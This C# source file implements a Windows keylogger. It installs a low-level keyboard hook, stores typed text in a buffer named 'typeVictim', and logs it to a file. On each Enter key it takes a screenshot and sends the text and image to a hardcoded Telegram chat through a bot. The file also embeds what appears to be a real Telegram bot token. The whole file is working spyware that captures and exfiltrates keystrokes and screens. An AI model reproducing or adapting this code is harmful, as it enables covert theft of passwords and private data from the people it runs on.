using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;

namespace ShowKeyBoard
{
    public class Controller
    {
        static TelegramBotClient botClient = new TelegramBotClient("941129353:AAFlkcB2_wlZpkFyUhua7AdxtUQ8d2vggrE");
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        public static string KeyCodeToUnicode(Keys key)
        {
            byte[] keyboardState = new byte[255];
            bool keyboardStateStatus = GetKeyboardState(keyboardState);

            if (!keyboardStateStatus)
            {
                return "";
            }

            uint virtualKeyCode = (uint)key;
            uint scanCode = MapVirtualKey(virtualKeyCode, 0);
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);

            StringBuilder result = new StringBuilder();
            ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);

            return result.ToString();
        }
        public static StringBuilder typeVictim = new StringBuilder();
        public static void CaptureScreen()
        {
            
        }
        public static Image Capture()
        {
            try
            {
                CaptureWindows captureWindows = new CaptureWindows();
                Image img = captureWindows.CaptureScreen();
                return img;
            }
            catch (Exception exx)
            {
                return null;
            }
        }
        static bool isShift  =false;
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys keysCode = (Keys)vkCode;
                KeysConverter kc = new KeysConverter();
                if (keysCode != Keys.Packet)
                {
                    String keys = kc.ConvertToString(keysCode);
                    
                    if (keys.Equals("Space"))
                        keys = " ";
                    if (keys.Contains("Back"))
                    {
                        if(typeVictim.Length>=1)
                        typeVictim.Remove(typeVictim.Length - 1, 1);
                        keys = "";
                    }
                    if (keys.ToLower().Contains("capital"))
                        keys = "";
                    if (keys.Contains("Enter"))
                    {
                        keys = "\n";
                    }
                    if (keys.Contains("Shift"))
                    {
                        isShift = true;
                        keys = "";
                    }
                    if (Console.CapsLock)
                    {
                        if(isShift)
                        keys = keys.ToLower();
                        else
                        keys = keys.ToUpper();
                    }
                    else
                    {
                        if (isShift)
                            keys = keys.ToUpper();
                        else
                            keys = keys.ToLower();
                    }
                    typeVictim.Append(keys.Replace("NumPad", "") + "");

                }
                if ((Keys)vkCode == Keys.Enter)
                {
                    //SendMess(typeVictim.ToString());
                    Console.WriteLine(typeVictim.ToString());
                    File.AppendAllText("Keylog.txt", typeVictim.ToString());
                    Image image = Capture();
                    if (image != null)
                        SendMess(image, typeVictim.ToString());
                    typeVictim.Clear();
                }
                Console.WriteLine(kc.ConvertToString(keysCode));
            }
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys keysCode = (Keys)vkCode;
                KeysConverter kc = new KeysConverter();
                String keys = kc.ConvertToString(keysCode);
                if (keys.Contains("Shift"))
                {
                    isShift = false;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        public static async void SendMess(String messs)
        {
            await botClient.SendTextMessageAsync(
                        chatId: 942830900,
                        text: messs
                    );
        }
        public static async void SendMess(Image image, String caption = "")
        {
            Stream stream = new System.IO.MemoryStream();
            image.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
            stream.Position = 0;
            await botClient.SendPhotoAsync(
                        chatId: 942830900,
                        photo: new Telegram.Bot.Types.InputFiles.InputOnlineFile(stream),
                        caption: caption

                    );
        }
        public static void StartKeyLoger()
        {
            _hookID = SetHook(_proc);
            CaptureScreen();
        }
        public static void StopKeyLoger()
        {
            UnhookWindowsHookEx(_hookID);
        }
    }
}
